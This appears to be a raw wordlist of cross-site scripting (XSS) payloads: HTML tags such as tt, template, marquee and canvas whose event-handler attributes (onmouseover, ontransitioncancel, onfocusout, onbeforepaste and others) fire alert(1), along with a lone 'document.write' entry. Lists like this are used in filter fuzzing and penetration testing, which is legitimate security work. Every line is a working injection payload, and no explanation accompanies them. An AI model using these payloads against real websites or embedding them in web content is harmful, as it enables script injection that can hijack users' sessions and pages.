"<tt onmouseover=""alert(1)"">test</tt>"
"<object onmousedown=""alert(1)"">test</object>"
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>"
<template onpointerout=alert(1)>XSS</template>
<s onpointerup=alert(1)>XSS</s>
"<select draggable=""true"" ondrag=""alert(1)"">test</select>"
"<a onmouseup=""alert(1)"">test</a>"
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>"
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>
"<time onclick=""alert(1)"">test</time>"
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>"
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
"<center onclick=""alert(1)"">test</center>"
"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>"
"<div onkeyup=""alert(1)"" contenteditable>test</div>"
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>"
<div onpointerout=alert(1)>XSS</div>
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>"
"<applet onmouseover=""alert(1)"">test</applet>"
"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>"
"<canvas onmousemove=""alert(1)"">test</canvas>"
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>"
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
<textarea onpointermove=alert(1)>XSS</textarea>
document.write
<area onpointerenter=alert(1)>XSS</area>
